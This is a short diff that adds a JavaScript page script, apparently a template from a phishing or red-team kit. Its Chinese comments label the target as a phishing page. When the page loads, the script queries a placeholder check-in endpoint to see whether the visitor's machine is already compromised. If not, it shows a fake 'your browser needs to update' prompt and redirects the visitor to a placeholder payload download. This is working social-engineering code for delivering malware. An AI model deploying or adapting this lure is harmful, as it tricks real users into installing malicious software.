@@ -1,0 +1,32 @@
+window.onload = function () {
+  var xhr = new XMLHttpRequest();
+  xhr.onreadystatechange = function () {
+    if (this.readyState === this.DONE) {
+      console.log(this.status);
+      console.log("xhr.responseText",xhr.responseText);
+
+      if (xhr.responseText == "FALSE") {
+        var r=confirm("您好,浏览器需要更新下载程序!是否继续?");
+        if (r==true){
+            window.location.href = "{{DOWNLOAD}}"; //这里是钓鱼页面的地址
+            //x="你按下的是\"确定\"按钮.";
+        }
+        else{
+            console.log(text);
+            //x="你按下的是\"取消\"按钮。";
+        }
+            //alert("没有上线-需要下载");
+            //window.location.href = "{{DOWNLOAD}}";  //这里是钓鱼页面的地址
+      }
+      else if (xhr.responseText == "TRUE") {
+            alert("已经上线-无需下载");
+      } else {
+            alert(xhr.responseText);
+      }
+    }
+  }
+  xhr.open("GET", "{{QUERY}}");  //这里上线查询地址
+  //xhr.setRequestHeader("If-None-Match","\"22426f327b8cd1:0\"");
+  //xhr.setRequestHeader("If-Modified-Since", "Sat, 31 Dec 2021 02:51:00 GMT");
+  xhr.send();
+};
